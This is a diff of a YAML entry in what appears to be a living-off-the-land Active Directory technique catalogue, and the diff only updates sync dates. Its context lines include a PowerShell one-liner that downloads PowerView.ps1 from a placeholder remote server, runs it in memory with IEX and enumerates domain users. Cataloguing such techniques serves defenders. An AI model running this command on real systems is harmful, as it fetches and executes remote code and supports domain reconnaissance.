@@ -12,7 +12,7 @@ sources:
   upstream_url: https://lolad-project.github.io
   license: verify upstream LICENSE
   upstream_version: 6ed6a258f6e5a4692cec07f9692ed097551e04e5
-  last_synced: '2026-11-14'
+  last_synced: '2026-11-16'
 commands:
 - template: powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://remoteserver/PowerView.ps1');
     Get-NetUser"
@@ -46,7 +46,7 @@ source_data:
       physical_occurrence_count: 1
     upstream_url: https://lolad-project.github.io
     upstream_version: 6ed6a258f6e5a4692cec07f9692ed097551e04e5
-    last_synced: '2026-11-14'
+    last_synced: '2026-11-16'
 enrichment:
   capabilities:
   - value: discovery
@@ -78,6 +78,6 @@ enrichment:
 _meta:
   schema_version: 1
   generated_by: loldex-projection
-  projected_at: '2026-11-14'
+  projected_at: '2026-11-16'
   source_hashes:
     LOLAD: sha256:8727770269c1fb1cc4e0aac888b97743d134de76db1ec377b516a9621906e6f2
